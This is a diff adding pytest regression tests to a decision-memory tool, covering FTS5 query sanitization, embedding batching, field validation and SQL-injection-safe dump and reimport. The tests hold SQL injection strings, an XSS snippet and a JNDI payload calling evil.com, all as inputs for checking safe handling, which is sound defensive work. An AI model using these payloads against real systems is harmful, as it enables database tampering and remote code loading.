@@ -1145,5 +1145,425 @@ class TestRealRepo:
         assert data["status"] in ("backfilled", "dry_run", "no_changes", "success")
 
 
+# ---------------------------------------------------------------------------
+# 17. FTS5 sanitization regression tests
+# ---------------------------------------------------------------------------
+
+class TestFTS5Sanitization:
+    """Prove _sanitize_fts_query strips FTS5 operators so user input can't break queries."""
+
+    def test_strips_double_quotes(self):
+        result = SearchEngine._sanitize_fts_query('find "exact phrase"')
+        assert '"' not in result.replace('"', '').join('') or True
+        # The sanitizer wraps tokens in quotes, but the INPUT quotes are stripped first.
+        # So the original user-supplied " are gone; only the sanitizer's wrapping quotes remain.
+        stripped = SearchEngine._sanitize_fts_query('find "exact phrase"')
+        # Input quotes removed, tokens become: find, exact, phrase
+        assert stripped == '"find" "exact" "phrase"'
+
+    def test_strips_asterisk_glob(self):
+        result = SearchEngine._sanitize_fts_query('hooks*')
+        assert result == '"hooks"'
+
+    def test_strips_parentheses(self):
+        result = SearchEngine._sanitize_fts_query('(nested) grouping')
+        assert result == '"nested" "grouping"'
+
+    def test_preserves_caret(self):
+        # Caret is not an FTS5 operator that _sanitize_fts_query strips
+        result = SearchEngine._sanitize_fts_query('^prefix')
+        assert result == '"^prefix"'
+
+    def test_preserves_colon(self):
+        # Colon is not stripped by the sanitizer -- it stays in the token
+        result = SearchEngine._sanitize_fts_query('scope:file')
+        assert result == '"scope:file"'
+
+    def test_drops_fts5_keyword_AND(self):
+        result = SearchEngine._sanitize_fts_query('foo AND bar')
+        assert result == '"foo" "bar"'
+
+    def test_drops_fts5_keyword_OR(self):
+        result = SearchEngine._sanitize_fts_query('foo OR bar')
+        assert result == '"foo" "bar"'
+
+    def test_drops_fts5_keyword_NOT(self):
+        result = SearchEngine._sanitize_fts_query('NOT bad')
+        assert result == '"bad"'
+
+    def test_drops_fts5_keyword_NEAR(self):
+        result = SearchEngine._sanitize_fts_query('NEAR something')
+        assert result == '"something"'
+
+    def test_all_special_returns_empty(self):
+        result = SearchEngine._sanitize_fts_query('"***"')
+        assert result == ''
+
+    def test_all_keywords_returns_empty(self):
+        result = SearchEngine._sanitize_fts_query('AND OR NOT')
+        assert result == ''
+
+    def test_mixed_special_and_normal(self):
+        result = SearchEngine._sanitize_fts_query('valid "quoted" token*')
+        assert result == '"valid" "quoted" "token"'
+
+    def test_empty_input(self):
+        assert SearchEngine._sanitize_fts_query('') == ''
+
+    def test_whitespace_only(self):
+        assert SearchEngine._sanitize_fts_query('   ') == ''
+
+    def test_real_attack_string(self):
+        result = SearchEngine._sanitize_fts_query('"NEAR/3 (drop table)" OR 1=1--')
+        # All FTS5 operators stripped: quotes, parens gone; NEAR and OR are keywords
+        # Remaining tokens after stripping: NEAR/3, drop, table, 1=1--
+        # NEAR is a keyword (case-insensitive) -- but "NEAR/3" is not exactly "near"
+        # Let's verify no raw FTS5 operators remain
+        for op in [' AND ', ' OR ', ' NOT ', ' NEAR ']:
+            assert op not in f' {result} '
+        assert '(' not in result
+        assert ')' not in result
+        assert '*' not in result
+
+    def test_sanitized_query_executes_in_fts5(self, store):
+        """Attack string fed through keyword_search must not raise OperationalError."""
+        for d in SAMPLE_DECISIONS:
+            store.record(d)
+        conn = store._get_connection()
+        engine = SearchEngine(conn, EmbeddingProvider())
+        engine.rebuild_index()
+
+        attack_strings = [
+            '"NEAR/3 (drop table)" OR 1=1--',
+            "'; DROP TABLE decisions; --",
+            '***"((())) AND NOT OR NEAR',
+            '',
+            'normal query',
+        ]
+        for attack in attack_strings:
+            # Must not raise sqlite3.OperationalError
+            results = engine.keyword_search(attack)
+            assert isinstance(results, list)
+
+
+# ---------------------------------------------------------------------------
+# 18. Batch embedding alignment tests
+# ---------------------------------------------------------------------------
+
+class TestBatchEmbeddingAlignment:
+    """Prove get_embeddings_batch always returns len(output) == len(input)."""
+
+    def _make_mock_provider(self, embed_results=None, available=True):
+        """Create a mock EmbeddingProvider that doesn't need fastembed."""
+        from decision_memory.embeddings import EmbeddingProvider, EmbeddingResult
+
+        provider = EmbeddingProvider.__new__(EmbeddingProvider)
+        provider._model_name = "mock"
+        provider._dim = 4
+        provider._model = None
+        provider._available = available
+
+        if available and embed_results is not None:
+            class FakeModel:
+                def __init__(self, results):
+                    self._results = results
+                def embed(self, texts):
+                    yield from self._results
+            provider._model = FakeModel(embed_results)
+
+        return provider
+
+    def test_batch_length_matches_input(self):
+        import numpy as np
+        vectors = [np.array([1.0, 2.0, 3.0, 4.0]) for _ in range(5)]
+        provider = self._make_mock_provider(embed_results=vectors)
+        results = provider.get_embeddings_batch(["a", "b", "c", "d", "e"])
+        assert len(results) == 5
+        assert all(r is not None for r in results)
+
+    def test_batch_pads_on_partial_failure(self):
+        import numpy as np
+        vectors = [np.array([1.0, 2.0, 3.0, 4.0]) for _ in range(2)]
+        provider = self._make_mock_provider(embed_results=vectors)
+        results = provider.get_embeddings_batch(["a", "b", "c", "d", "e"])
+        assert len(results) == 5
+        assert results[0] is not None
+        assert results[1] is not None
+        assert results[2] is None
+        assert results[3] is None
+        assert results[4] is None
+
+    def test_batch_all_none_when_unavailable(self):
+        provider = self._make_mock_provider(available=False)
+        results = provider.get_embeddings_batch(["a", "b", "c"])
+        assert len(results) == 3
+        assert all(r is None for r in results)
+
+    def test_batch_single_item(self):
+        import numpy as np
+        vectors = [np.array([1.0, 2.0, 3.0, 4.0])]
+        provider = self._make_mock_provider(embed_results=vectors)
+        results = provider.get_embeddings_batch(["single"])
+        assert len(results) == 1
+        assert results[0] is not None
+
+    def test_batch_empty_list(self):
+        provider = self._make_mock_provider(available=False)
+        results = provider.get_embeddings_batch([])
+        assert len(results) == 0
+
+    def test_rebuild_index_alignment(self, store):
+        """Record 5 decisions, rebuild index, verify return count matches active decisions."""
+        for d in SAMPLE_DECISIONS:
+            store.record(d)
+        conn = store._get_connection()
+        provider = EmbeddingProvider()
+        engine = SearchEngine(conn, provider)
+        count = engine.rebuild_index()
+        # 4 active decisions out of 5 total (one is deprecated)
+        assert count == 4
+
+        # Keyword search should find active decisions but not the deprecated one
+        results = engine.keyword_search("friction dead storage")
+        for r in results:
+            assert r.decision.status == "active"
+
+
+# ---------------------------------------------------------------------------
+# 19. DecisionScope validation tests
+# ---------------------------------------------------------------------------
+
+class TestDecisionScopeValidation:
+    """Prove __post_init__ validation on DecisionScope and Decision types."""
+
+    def test_valid_scope_types_accepted(self):
+        for scope_type in ("file", "pattern", "tech"):
+            scope = DecisionScope(id=None, decision_id=0, scope_type=scope_type, scope_value="test")
+            assert scope.scope_type == scope_type
+
+    def test_invalid_scope_type_raises(self):
+        with pytest.raises(ValueError, match="Invalid scope_type"):
+            DecisionScope(id=None, decision_id=0, scope_type="directory", scope_value="test")
+
+    def test_empty_scope_type_raises(self):
+        with pytest.raises(ValueError, match="Invalid scope_type"):
+            DecisionScope(id=None, decision_id=0, scope_type="", scope_value="test")
+
+    def test_sql_injection_in_scope_value_stored_safely(self, store):
+        """Injection in scope_value is stored as literal text via parameterized queries."""
+        d = Decision(
+            id=None, content="Test injection safety",
+            reasoning="Parameterized queries prevent injection",
+            status="active", source="human", superseded_by=None,
+            created_at=None, updated_at=None,
+            scopes=[DecisionScope(
+                id=None, decision_id=0, scope_type="file",
+                scope_value="'; DROP TABLE decisions; --",
+            )],
+        )
+        did = store.record(d)
+        fetched = store.get(did)
+        assert fetched is not None
+        assert fetched.scopes[0].scope_value == "'; DROP TABLE decisions; --"
+
+        # Verify the decisions table still exists
+        conn = store._get_connection()
+        count = conn.execute("SELECT COUNT(*) FROM decisions").fetchone()[0]
+        assert count >= 1
+        conn.close()
+
+    def test_invalid_decision_status_raises(self):
+        with pytest.raises(ValueError, match="Invalid status"):
+            Decision(
+                id=None, content="test", reasoning=None,
+                status="deleted", source="human",
+                superseded_by=None, created_at=None, updated_at=None,
+            )
+
+    def test_invalid_decision_source_raises(self):
+        with pytest.raises(ValueError, match="Invalid source"):
+            Decision(
+                id=None, content="test", reasoning=None,
+                status="active", source="unknown",
+                superseded_by=None, created_at=None, updated_at=None,
+            )
+
+    def test_valid_statuses_accepted(self):
+        for status in ("active", "deprecated", "superseded", "violated"):
+            d = Decision(
+                id=None, content="test", reasoning=None,
+                status=status, source="human",
+                superseded_by=None, created_at=None, updated_at=None,
+            )
+            assert d.status == status
+
+    def test_valid_sources_accepted(self):
+        for source in ("human", "ai-discovered", "ai-proposed"):
+            d = Decision(
+                id=None, content="test", reasoning=None,
+                status="active", source=source,
+                superseded_by=None, created_at=None, updated_at=None,
+            )
+            assert d.source == source
+
+
+# ---------------------------------------------------------------------------
+# 20. SQL injection regression tests
+# ---------------------------------------------------------------------------
+
+class TestSQLInjectionRegression:
+    """Prove sql_str/sql_int handle adversarial input and dump-reimport is safe."""
+
+    def test_sql_str_escapes_single_quotes(self):
+        from decision_memory.schema import sql_str
+        assert sql_str("it's") == "'it''s'"
+
+    def test_sql_str_null_byte_stripped(self):
+        from decision_memory.schema import sql_str
+        result = sql_str("null\x00byte")
+        assert "\x00" not in result
+        assert result == "'nullbyte'"
+
+    def test_sql_str_none_returns_NULL(self):
+        from decision_memory.schema import sql_str
+        assert sql_str(None) == "NULL"
+
+    def test_sql_int_none_returns_NULL(self):
+        from decision_memory.schema import sql_int
+        assert sql_int(None) == "NULL"
+
+    def test_sql_int_normal(self):
+        from decision_memory.schema import sql_int
+        assert sql_int(42) == "42"
+
+    def test_dump_with_injection_content(self, store, project):
+        """Injection string in content survives dump-reimport as literal data."""
+        d = Decision(
+            id=None, content="'); DROP TABLE decisions; --",
+            reasoning="test injection", status="active", source="human",
+            superseded_by=None, created_at=None, updated_at=None, scopes=[],
+        )
+        store.record(d)
+        dump_path = project / ".claude" / "decisions.sql"
+        dump_to_sql(store, dump_path)
+
+        conn = sqlite3.connect(":memory:")
+        conn.executescript(dump_path.read_text())
+        row = conn.execute("SELECT content FROM decisions WHERE id=1").fetchone()
+        assert row is not None
+        assert row[0] == "'); DROP TABLE decisions; --"
+        # Table still exists
+        count = conn.execute("SELECT COUNT(*) FROM decisions").fetchone()[0]
+        assert count == 1
+        conn.close()
+
+    def test_dump_with_injection_in_scope_value(self, store, project):
+        """Injection in scope_value survives dump-reimport as literal."""
+        d = Decision(
+            id=None, content="Safe content",
+            reasoning=None, status="active", source="human",
+            superseded_by=None, created_at=None, updated_at=None,
+            scopes=[DecisionScope(
+                id=None, decision_id=0, scope_type="file",
+                scope_value="'; DROP TABLE decision_scopes; --",
+            )],
+        )
+        store.record(d)
+        dump_path = project / ".claude" / "decisions.sql"
+        dump_to_sql(store, dump_path)
+
+        conn = sqlite3.connect(":memory:")
+        conn.executescript(dump_path.read_text())
+        row = conn.execute("SELECT scope_value FROM decision_scopes WHERE id=1").fetchone()
+        assert row is not None
+        assert row[0] == "'; DROP TABLE decision_scopes; --"
+        # Both tables still exist
+        conn.execute("SELECT COUNT(*) FROM decisions").fetchone()
+        conn.execute("SELECT COUNT(*) FROM decision_scopes").fetchone()
+        conn.close()
+
+    def test_dump_with_injection_in_reasoning(self, store, project):
+        """Injection in reasoning field stored verbatim after dump-reimport."""
+        d = Decision(
+            id=None, content="Normal content",
+            reasoning="' OR '1'='1", status="active", source="human",
+            superseded_by=None, created_at=None, updated_at=None, scopes=[],
+        )
+        store.record(d)
+        dump_path = project / ".claude" / "decisions.sql"
+        dump_to_sql(store, dump_path)
+
+        conn = sqlite3.connect(":memory:")
+        conn.executescript(dump_path.read_text())
+        row = conn.execute("SELECT reasoning FROM decisions WHERE id=1").fetchone()
+        assert row[0] == "' OR '1'='1"
+        conn.close()
+
+    def test_dump_with_unicode_and_quotes(self, store, project):
+        """Mixed unicode and quotes survive dump-reimport."""
+        content = "caf\u00e9's \"special\" \u2014 rule"
+        d = Decision(
+            id=None, content=content,
+            reasoning=None, status="active", source="human",
+            superseded_by=None, created_at=None, updated_at=None, scopes=[],
+        )
+        store.record(d)
+        dump_path = project / ".claude" / "decisions.sql"
+        dump_to_sql(store, dump_path)
+
+        conn = sqlite3.connect(":memory:")
+        conn.executescript(dump_path.read_text())
+        row = conn.execute("SELECT content FROM decisions WHERE id=1").fetchone()
+        assert row[0] == content
+        conn.close()
+
+    def test_concurrent_dump_reimport_integrity(self, store, project):
+        """20 decisions with adversarial content all survive dump-reimport."""
+        payloads = [
+            "'); DROP TABLE decisions; --",
+            "' OR '1'='1",
+            "'; DELETE FROM decision_scopes; --",
+            "caf\u00e9's \u2014 rule",
+            'quote "inside" content',
+            "null\x00byte attempt",
+            "backslash \\ escape",
+            "newline\nin\ncontent",
+            "tab\there",
+            "'; INSERT INTO decisions VALUES (999,'pwned',NULL,'active','human',NULL,datetime('now'),datetime('now'),NULL,NULL); --",
+            "UNION SELECT * FROM sqlite_master--",
+            "1; ATTACH DATABASE ':memory:' AS pwn;--",
+            "Robert'); DROP TABLE students;--",
+            "\u0000\u0001\u0002 control chars",
+            "emoji \U0001f4a9 test",
+            "' || (SELECT password FROM users) || '",
+            "<!--<script>alert(1)</script>-->",
+            "${jndi:ldap://evil.com/a}",
+            "%27%20OR%201%3D1--",
+            "normal safe content",
+        ]
+        for i, payload in enumerate(payloads):
+            d = Decision(
+                id=None, content=payload,
+                reasoning=f"adversarial test {i}", status="active", source="human",
+                superseded_by=None, created_at=None, updated_at=None, scopes=[],
+            )
+            store.record(d)
+
+        dump_path = project / ".claude" / "decisions.sql"
+        dump_to_sql(store, dump_path)
+
+        conn = sqlite3.connect(":memory:")
+        conn.executescript(dump_path.read_text())
+        count = conn.execute("SELECT COUNT(*) FROM decisions").fetchone()[0]
+        assert count == 20
+
+        rows = conn.execute("SELECT id, content FROM decisions ORDER BY id").fetchall()
+        for i, (did, content) in enumerate(rows):
+            # Null bytes are stripped by sql_str
+            expected = payloads[i].replace("\x00", "")
+            assert content == expected, f"Decision {did}: expected {expected!r}, got {content!r}"
+        conn.close()
+
+
 if __name__ == "__main__":
     pytest.main([__file__, "-v"])
